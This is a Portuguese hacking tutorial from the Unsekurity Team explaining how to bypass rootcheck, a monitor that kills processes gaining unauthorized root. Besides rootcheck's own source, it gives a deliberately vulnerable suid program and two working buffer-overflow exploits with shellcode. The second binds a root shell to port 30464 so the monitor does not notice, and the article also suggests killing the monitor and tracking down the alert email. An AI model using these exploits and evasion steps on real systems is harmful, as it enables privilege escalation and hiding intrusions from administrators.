@@ -1,0 +1,749 @@
+#############################################################################
+############################ UNSEKURITY TEAM ################################
+#############################################################################
+
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Este e outros artigos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+
+
+OBSERVACAO: O autor nao se resposanbiliza pelo mau uso das informacoes e
+	    dados aqui disponibilizados.Este artigo possui somente 
+	    propositos educacionais.
+
+
+                      ****************************
+		      *  PASSANDO POR ROOTCHECK  *
+		      ****************************
+
+
+-------------------------------- INDICE ---------------------------------
+
+1 - INTRODUCAO
+2 - ROOTCHECK
+    2.1 - O que eh
+    2.2 - Baixando e Instalando
+3 - PASSANDO PELO ROOTCHECK
+    3.1 - O Metodo 
+4 - TERMINANDO
+    4.1 - Links e Referencias
+    4.2 - Consideracoes Finais
+
+--------------------------------------------------------------------------
+
+---------------
+1 - INTRODUCAO |
+---------------
+
+Muitos programas tem sido usados ao longo dos anos para aumentar a seguranca
+de uma rede contra as mais conhecidas tecnicas de obtencao de root.Obter
+root num sistema representa um estagio bastante elevado no dominio de uma
+rede por parte de um fucador.Uma vez obtido root num sistema, as 
+possibilidades existentes para o dominio completo dos aplicativos que estao 
+sendo executados numa rede eh demasiadamente grande.Senhas de banco de dados
+podem ser capturadas, implementacao de ponte servidora em tecnicas avancadas
+podem ser feitas, acesso a segmentos de rede e redirecionamento de servicos
+se torna trivial.Eh nesse contexto que varias ferramentas tem sido utilizadas
+e construidas, ou seja, o intuito eh dificultar ao maximo a obtencao de root
+no sistema por parte de um invasor.Uma das ferramentas mais interessantes e
+seu conceito, serah descrito neste artigo.O conceito usado pelo rootcheck
+eh bastante amplo e veremos de forma bastante pratica como passar por ele.
+Outra coisa que vai se evidenciar neste artigo, eh a necessidade de saber
+escrever shellcodes.
+
+--------------
+2 - ROOTCHECK |
+--------------
+
+2.1 - O que eh
+---------------
+
+O RootCheck eh uma ferramenta usada para aumentar a seguranca numa rede.
+O que ela faz eh o seguinte: Quando um usuario que nao possui permissao
+para tornar sua (e)uid == 0, consegue tornar-se root(euid(0)), entao esse
+programa derruba o o processo que o usuarios estah executando(geralmente eh
+/bin/sh), e em seguida manda um mail para o administrador da rede avisando
+que determinado usuario foi derrubado pelo rootcheck.
+O conceito usado por esta ferramenta eh usado tambem em outras ferramentas
+da seguranca(alguns IDS).Ao meu ver eh um conceito interessante, e que se
+investissem mais nesse conceito, sem duvida ficaria dificil alguem conseguir
+root num sistema alheio.
+
+2.2 - Baixando e Instalando
+-----------------------------
+
+Essa ferramenta foi contruida por BIT'98, mas o pessoal da w00w00 ajeitou
+ela para que funcionasse de forma eficiente.Abaixo segue seu codigo fonte,
+mas se preferir baixar, procure na pagina da w00w00(www.w00w00.org).
+
+------------------------------ rootcheck.c --------------------------------
+
+/*
+   BiT '98
+   completely rewritten for obvious reasons...
+   first of all, it didnt work (sigsegv and shit)
+   second.. my house got raided and everything was taken
+   third.. i have nothing to do waiting for my phone line to return.......
+ */
+
+/*
+   Killing processes with (e)uid==0 if they aint owned by root or anyone
+   in /etc/rootusers, except if the process name is in /etc/suids
+   
+   bugfix: forgot a signal() in the SIGHUP handler, im to lazy to use 
+           sigaction()
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/stat.h>
+#include <netdb.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <signal.h>
+#include <pwd.h>
+#include <time.h>
+
+#define VERSION         "0.6"
+#define ROOTUSERS       "/etc/rootusers"
+#define SUIDS           "/etc/suids"
+#define PIDFILE         "/var/run/rootcheck.pid"
+#define EMAIL           "root@localhost" /* you might want to change this */
+#define NETSTAT         "/bin/netstat"
+#define W               "/usr/bin/w"
+#define LAST            "/usr/bin/last"
+
+struct rootcheck {
+    char name[256];
+    pid_t pid, ppid;
+    uid_t uid, euid;
+};
+
+uid_t rootusers[16];            /* more then 16 roots?! */
+char suids[64][256];            /* what about removing some root suids? */
+int nrootusers, nsuids;
+
+void sighup(int s);
+void rehash(int status);
+int okuid(uid_t uid);
+void foreverloop(void);
+struct rootcheck *getinfo(char *d_name);
+struct rootcheck *trace_to_init(struct rootcheck par);
+void checkup(char *d_name);
+void mail_n_kill(struct rootcheck cur, struct rootcheck par);
+
+void main(int argc, char **argv)
+{
+    int i;
+    char buf[512];
+
+    printf("rootcheck %s - BiT '98\n\n", VERSION);
+
+    if (geteuid())
+        printf("I prefer euid 0\n"), exit(-1);
+
+    if ((i = open(PIDFILE, O_RDONLY)) != -1) {
+        read(i, buf, sizeof(buf));
+        if (kill(atoi(buf), SIGCHLD) != -1)
+            printf("Allready running.\n"), exit(-1);
+        close(i);
+    }
+    printf("Loading init files...");
+    rehash(0);
+    printf("done\nSetting up HUP handler and detaching...");
+    fflush(stdout);
+
+    signal(SIGHUP, (void *) &sighup);
+    if ((i = fork()) == -1)
+        printf("can't fork()?!\n"), exit(-1);
+    if (i)
+        putchar('\n'), close(0), close(1), close(2), exit(-1);
+
+    if ((i = open(PIDFILE, O_WRONLY | O_CREAT)) != -1) {
+        sprintf(buf, "%d", getpid());
+        write(i, buf, strlen(buf));
+        close(i);
+    }
+    foreverloop();
+}
+
+void foreverloop(void)
+{
+    DIR *procdir;
+    struct dirent *pproc;
+    struct stat sbuf;
+    chdir("/proc");
+    procdir = opendir(".");     /* if this doesnt work............ */
+
+    while (1) {
+        if ((pproc = readdir(procdir)) != NULL) {
+            if (stat(pproc->d_name, &sbuf) == -1)
+                continue;
+            if (S_ISDIR(sbuf.st_mode))
+                checkup(pproc->d_name);
+        } else
+            rewinddir(procdir);
+        usleep(10);             /* yaya lemme eat yer cpu */
+    }
+}
+
+void checkup(char *d_name)
+{
+    struct rootcheck *p, cur, par;
+    char buf[512];
+
+    if (!strcmp(d_name, "scsi") || !strcmp(d_name, "net") || !strcmp(d_name, "sys")
+        || !strcmp(d_name, "self") || !strcmp(d_name, ".")
+        || !strcmp(d_name, "..") || !strcmp(d_name, "1"))
+        return;
+
+
+    if ((p = getinfo(d_name)) == NULL)
+        return;
+    memcpy(&cur, p, sizeof(struct rootcheck));
+
+    if (cur.ppid == 1)
+        return;
+
+    if (cur.uid && cur.euid)
+        return;
+
+    if (oksuid(cur.name))
+        return;
+
+    if ((p = trace_to_init(cur)) == NULL)
+        return;
+    memcpy(&par, p, sizeof(struct rootcheck));
+
+    if (okuid(par.uid))
+        return;
+
+    mail_n_kill(cur, par);
+}
+
+void mail_n_kill(struct rootcheck cur, struct rootcheck par)
+{
+    FILE *fd;
+    char buf[256], fn[256];
+    struct passwd *pwd;
+
+    unsetenv("IFS");
+    srand(time(NULL));
+    pwd = getpwuid(par.uid);
+    sprintf(fn, "/tmp/rc%d", rand());
+
+    fd = fopen(fn, "w");
+    sprintf(buf, "User %s got euid 0 from %s\n\nSystem data follows:\n\n",
+            pwd->pw_name, cur.name);
+    fputs(buf, fd);
+    fclose(fd);
+
+    sprintf(buf, "%s -a -n >> %s", NETSTAT, fn);
+    system(buf);
+
+    sprintf(buf, "%s >> %s", W, fn);
+    system(buf);
+
+    sprintf(buf, "%s -20 >> %s", LAST, fn);
+    system(buf);
+
+    sprintf(buf, "cat %s | mail %s", fn, EMAIL);
+    system(buf);
+
+    unlink(fn);
+    kill(par.pid, 9);           /* SPLAM! */
+}
+
+/* not really correct name, traces until parents uid is 0 */
+
+struct rootcheck *trace_to_init(struct rootcheck par)
+{
+    static struct rootcheck *p, cur, old;
+    char buf[512];
+
+    sprintf(buf, "%d", par.ppid);
+    if ((p = getinfo(buf)) == NULL)
+        return NULL;
+    memcpy(&old, &par, sizeof(struct rootcheck));
+    memcpy(&cur, p, sizeof(struct rootcheck));
+
+    while (1) {
+        if (cur.uid == 0 && cur.euid == 0)
+            return &old;
+        sprintf(buf, "%d", cur.ppid);
+        if ((p = getinfo(buf)) == NULL)
+            return NULL;
+        memcpy(&old, &cur, sizeof(struct rootcheck));
+        memcpy(&cur, p, sizeof(struct rootcheck));
+    }
+}
+
+int oksuid(char *owner)
+{
+    int i;
+
+    for (i = 0; i < nsuids; i++)
+        if (strcasecmp(suids[i], owner) == 0)
+            return 1;
+    return 0;
+}
+
+int okuid(uid_t uid)
+{
+    int i;
+
+    if (!uid)
+        return 1;
+
+    for (i = 0; i < nrootusers; i++) {
+        if (rootusers[i] == uid)
+            return 1;
+    }
+    return 0;
+}
+
+struct rootcheck *getinfo(char *d_name)
+{
+    static struct rootcheck rc;
+    char buf[512], fn[512], *p, i;
+    FILE *fd;
+
+    sprintf(fn, "%s/status", d_name);
+
+    if ((fd = fopen(fn, "r")) == NULL)
+        return NULL;
+
+    if (fgets(buf, sizeof(buf), fd) == NULL)
+        return NULL;
+    buf[strlen(buf) - 1] = 0;
+    strncpy(rc.name, (buf + 6), sizeof(rc.name));
+
+    if (fgets(buf, sizeof(buf), fd) == NULL)
+        return NULL;
+
+    if (fgets(buf, sizeof(buf), fd) == NULL)
+        return NULL;
+    rc.pid = atoi((buf + 5));
+
+    if (fgets(buf, sizeof(buf), fd) == NULL)
+        return NULL;
+    rc.ppid = atoi((buf + 6));
+
+    if (fgets(buf, sizeof(buf), fd) == NULL)
+        return NULL;
+
+    p = buf + 5;
+    for (i = 0; *(p + i) != '\t'; i++);
+    *(p + i) = 0;
+    rc.uid = atoi(p);
+
+    p += i;
+    p++;
+    for (i = 0; *(p + i) != '\t'; i++);
+    *(p + i) = 0;
+    rc.euid = atoi(p);
+    fclose(fd);
+
+    return &rc;
+}
+
+void sighup(int s)
+{
+    signal(SIGHUP, (void *) &sighup);
+    rehash(1);
+}
+
+void rehash(int status)
+{
+    FILE *fd;
+    char buf[256];
+    struct passwd *pwd;
+
+    nsuids = nrootusers = 0;
+
+    fd = fopen(ROOTUSERS, "r");
+    if (fd == NULL && !status)
+        printf("can't open %s..", ROOTUSERS);
+
+    if (fd) {
+        while (fgets(buf, sizeof(buf), fd) != NULL) {
+            if (buf[strlen(buf) - 1] == '\n')
+                buf[strlen(buf) - 1] = 0;
+            if ((pwd = getpwnam(buf)) == NULL)
+                break;
+            rootusers[nrootusers++] = pwd->pw_uid;
+        }
+        fclose(fd);
+    }
+    fd = fopen(SUIDS, "r");
+    if (fd == NULL && !status)
+        printf("can't open %s..", SUIDS);
+
+    if (fd) {
+        while (fgets(buf, sizeof(buf), fd) != NULL) {
+            if (buf[strlen(buf) - 1] == '\n')
+                buf[strlen(buf) - 1] = 0;
+            buf[255] = 0;
+            strcpy(suids[nsuids++], buf);
+        }
+        fclose(fd);
+    }
+}
+
+--------------------------------------------------------------------------
+
+O seu uso nao possui muito segredo.Basta definir o que ele pede(#define) e
+criar os arquivos correspondentes.Veremos seu uso em cima do seguinte 
+programa bugado:
+
+--------------------------------- bug1.c ---------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main(int argc, char *argv[]){
+char buffer[512];
+if(argc < 2){
+printf("Programa bugado!!\n");
+printf("Uso: %s <string>\n",argv[0]);
+exit(0);
+}
+strcpy(buffer,argv[1]);
+printf("Voce digitou %s!!\n",buffer);
+return 0;
+}
+
+---------------------------------------------------------------------------
+
+Este programa acima possui uma condicao de buffer overflow que pode ser
+facilmente exploitada.Compile ele e defina-o como suid root.Depois 
+acrescente ele no arquivo suids do rootcheck, exemplo:
+
+#define ROOTUSERS       "/etc/rootusers"
+#define SUIDS           "/etc/suids"
+
+Em /etc/rootusers coloque root e em /etc/suids coloque /tmp/bug1.
+
+De posse dessas informacoes, nos podemos entao tentar exploitar o programa
+bugado usando um simples exploit:
+
+------------------------------- ex1.c ------------------------------------
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define NOP     0x90
+#define ALIGN      0
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+char shellcode[] =
+  "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* Setuid(0) */
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int main(int argc, char *argv[])
+{
+char *buffer;
+long retaddr;
+int i ,tamanho = 0, offset = 0;
+
+if(argc < 2){
+printf("Exemplo 1 de exploit para rootcheck!!\n");
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+printf("Obs:Digite o tamanho do buffer!!\n\n");
+exit(0);
+}
+if (argc > 1) {
+tamanho = atoi(argv[1]);
+}
+if (argc > 2) {
+offset = atoi(argv[2]);
+}
+
+if(!(buffer = malloc(tamanho))){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+retaddr = pega_sp() - offset;
+
+for (i=0;i<tamanho;i+=4)
+
+       {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* Atencao no PATH abaixo. */
+
+execl("./bug1","bug1",buffer,0);
+}
+
+---------------------------------------------------------------------------
+
+Antes de compilar o programa acima, execute o rootcheck.
+Compilando e executando o exploit acima, nos podemos ver o rootcheck em
+acao:
+
++ Como root:
+
+localhost:/crazy/progs/grupos/w00w00# ./rootcheck
+rootcheck 0.6 - BiT '98
+
+Loading init files...done
+Setting up HUP handler and detaching...
+
++ Como usuario normal:
+
+localhost:/tmp$ ./ex1 610
+Voce digitou A1U°I
+            I1U
+Ø@I
+èÜÿÿÿ/bin/shÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(
+úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿(úÿ¿á!!
+sh-2.03#
+
+El Vento 2.2.13.
+
+localhost login:
+
+O que aconteceu foi o seguinte.O programa foi exploitado com sucesso, nos
+caimos numa shell root(sh-2.03#), mas em seguida o rootcheck nos derrubou
+(El Vento 2.2.13. ... localhost login:).Podemos perfeitamente ver, que para
+o esquema mais comum de exploitacao para obter root shell, esse programa
+eh eficiente, mas por um lado, esse programa(rootshell) se denuncia ao
+evidenciar a nossa queda.Alguns IDS usam a mesma metodologia e permite 
+que um usuario de tentou obter shell root se logue novamente.
+Isso ainda nao eh tudo, o rootcheck enviou um e-mail para o usuario
+definido, no nosso caso root@localhost contendo informacoes sobre o 
+usuario que tentou obter root e sobre o estado da rede naquele momento.
+Abaixo segue um pedaco do e-mail enviado pelo rootcheck:
+
+From root@localhost  Sat Mar 12 07:56:55 2000
+Return-Path: <root>
+Received: (from root@localhost)
+        by localhost (8.9.3/8.9.3) id HAA00209
+        for root@localhost; Sat, 12 Mar 2000 07:56:55 -0300
+Date: Sat, 12 Mar 2000 07:56:55 -0300
+From: root@localhost
+Message-Id: <200003121056.HAA00209@localhost>
+To: root@localhost
+
+User nashleon got euid 0 from sh
+
+System data follows:
+
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN
+...
+...
+
+O resto eh informacoes sobre processos e conexoes ativas.
+
+----------------------------
+3 - PASSANDO PELO ROOTCHECK |
+----------------------------
+
+Um fucador experiente 'sentiria no tato' que algo "incomum" aconteceu.Ele
+iria procurar saber o que o derrubou e porque.Mas o detalhe maior estah
+no seguinte fato: "A root shell havia sido adquirida!!".
+A evidencia de que o checkroot ou afins estah instalado eh justamente o
+fato do usuario ter sido derrubado.
+
+3.1 - O Metodo
+---------------
+
+Existem varios metodos de se passar por este programa.Como vimos no caso
+acima, eh possivel executarmos codigo malicioso como root(/bin/sh), logo,
+poderiamos killar o rootcheck, efetuar uma especie de race condition e etc.
+Mas ao meu ver, o modo mais simples eh alterarmos o shellcode para executar
+algo diferente de /bin/sh fugindo assim da percepcao de rootcheck quanto ao
+euid(0), pois este eh realmente o problema. 
+O exploit abaixo binda uma shell root a uma porta alta.O shellcode foi
+originalmente escrito pelo Taeho Oh e alterado por mim(setuid(0)) para 
+nosso propositos:
+
+-------------------------------- ex2.c ---------------------------------
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define NOP     0x90
+#define ALIGN      0
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+char shellcode[] =
+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
+"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
+"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
+"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
+"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
+"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
+"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
+"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
+"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
+"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
+"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
+"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
+"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";
+
+
+int main(int argc, char *argv[])
+{
+char *buffer;
+long retaddr;
+int i ,tamanho = 0, offset = 0;
+
+if(argc < 2){
+printf("Exploit que passa por rootcheck!!\n");
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+printf("Obs:Digite o tamanho do buffer!!\n\n");
+exit(0);
+}
+if (argc > 1) {
+tamanho = atoi(argv[1]);
+}
+if (argc > 2) {
+offset = atoi(argv[2]);
+}
+
+if(!(buffer = malloc(tamanho))){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+
+retaddr = pega_sp() - offset;
+
+for (i=0;i<tamanho;i+=4)
+       {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+
+for (i=0;i<(tamanho-strlen(shellcode)-100);i++)
+   *(buffer+i) = NOP;
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+execl("./bug1","bug1",buffer,0);
+}
+
+-------------------------------------------------------------------------
+
+Executando o exploit acima, nos podemos ver que o rootcheck eh ineficiente.
+Deve aparecer algo desse jeito:
+
+localhost:/tmp$ ./ex2 610 
+XXXXXX...(monte de caracteres estranhos)
+XXX
+XXX
+Depois vc deve cair de volta na sua shell.Nao se preocupe se nao ficar nada
+legivel, o que aconteceu eh que foi imprimido na tela do monitor(stdout-padrao)
+caracters nao imprimiveis.Depois disso voce pode sair da rede ou em outro
+console digitar:
+
+localhost:/tmp$ telnet localhost 30464
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+id;
+uid=0(root) gid=100(users) groups=100(users)
+: command not found
+exit;
+Connection closed by foreign host.
+
+Pronto amigo.Voce bindou uma shell root a uma porta alta(30464) e passou
+pelo rootcheck tranquilamente.
+
+Voce pode contemplar agora diversas teorias, como acrescentar um usuario
+ao passwd, fazer um shellcode para derrubar o rootcheck caso saiba o pid
+dele, etc.Use a sua imaginacao e os seus neuronios, com certeza voce 
+conseguirah passar por este desafio.Outra coisa reside no fato de voce ter
+sido logado.Como um e-mail pode ter sido enviado(no nosso exemplo foi) para
+alguem, voce precisa encontrar o mesmo.Existem tecnicas para fazer isto,
+mas cada caso eh um caso.
+
+---------------
+4 - TERMINANDO |
+---------------
+
+Eu jah vih algumas redes americanas usarem esta ferramenta.O conceito dela
+eh bem amplo, voce poderah ver algo parecido em alguns esquemas de IDS por
+aih.Mas com um pouco de perspicacia e malicia voce poderah facilmente
+detectar e passar por estes esquemas.O que se pode evidenciar mais uma vez
+eh que um administrador de rede nao deve confiar somente nessas ferramentas.
+Sem duvida que a grande maioria dos 'script kiddies' nao contemplariam uma
+solucao para este problema, mas fucadores com conhecimentos basicos e um
+pouco de experiencia 'venceriam' esse desafio.Quanto ao fucador, esse eh
+um obstaculo simples frente a centenas de outros que existem por aih, nao
+pense que saber passar ou 'detonar' algumas das ferramentas usadas pela
+comunidade de seguranca o torna melhor que eles.Lembre-se, amigo, da mesma
+forma que voce 'maquina' tecnicas para derrubar conceitos e ferramentas
+de seguranca, o pessoal da seguranca 'maquina' e 'cria' obstaculos para
+dificultar ao maximo o sucesso que um fucador possa vir a obter numa
+investida qualquer.
+
+
+4.1 - Links e Referencias
+--------------------------
+
+* Sobre rootcheck:
+
+A ferramenta em sih possui um conceito amplo, entao eh bom analisar outras
+ferramentas de ISD.
+
+http://www.w00w00.org/ 
+http://packetstorm.securify.com/
+http://www.securityfocus.com/
+
+* Home pages atuais do Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+* Outros links muito interessantes:
+
+http://www.hacker.com.br/
+http://www.bufferoverflow.org/
+http://www.taldowin.com.br/
+http://www.securenet.com.br/
+http://www.absoluta.org/
+
+
+4.2 - Consideracoes Finais
+---------------------------
+
+Essa foi mais uma publicacao que expoe o perigo de se confiar na 'maquina'.
+Sem duvida que esses programas sao bons e devem ser usados, mas nao sao a
+solucao.Eh isto que quero evidenciar.Hoje em dia existe uma peneira, mas
+fucadores com conhecimentos elevados nao sao peneirados.Varios outros
+materiais estao a caminho, e o grau de dificuldade deve diminuir assim que
+sairem novos tutoriais.Espero que todas essas publicacoes venham a ser
+validas para alguem e agradeco as pessoas que nos tem dado apoio e nos
+criticados com criticas construtivas.Um abraco a todos.
+
+
+						Nash Leon
+
+--------------------------------- EOF ----------------------------------
+
